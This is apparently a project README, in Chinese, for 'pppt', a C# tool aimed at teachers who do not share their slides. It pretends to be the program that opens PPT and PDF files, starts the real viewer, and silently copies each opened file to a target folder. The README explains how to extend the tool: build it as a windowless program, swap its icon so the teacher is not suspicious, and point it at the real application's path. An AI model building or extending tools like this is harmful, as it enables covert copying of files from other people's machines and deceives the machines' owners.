# pppt
😀 专治不把ppt给同学们的剧毒老师。



## 说明

二进制文件夹下有几个文本文件。

1. ### ppt.txt	pdf.txt ...

   用于存放真实打开文档的路径。

2. ### target.txt

   用于存放复制文件的目标目录。



## 扩展

需要扩展可执行文件的原因是图标问题，避免被剧毒老师识破。

目前只实现了ppt与pdf文件的偷拷贝功能，实现非常容易扩展，请看如下步骤。

### 第一步

新建控制台项目并将项目中的输出程序设置为窗口程序（让程序没有任何窗口的前提下运行）。

### 第二步

将程序的图标改为能蒙混过关的程序图标。

### 第三步

```c#
using pppt.Core;

namespace pppt.App {
    class Program {
        static void Main( string[] args ) {
            PPPT.Start( args, "ppt.txt" );
        }
    }
}
```

ppt.txt处改为该类型文件打开软件的路径。

例如：

file.txt

```text
C:\\Programs\\AppWhichCanOpenFile\\app.exe
```



祝你们好运！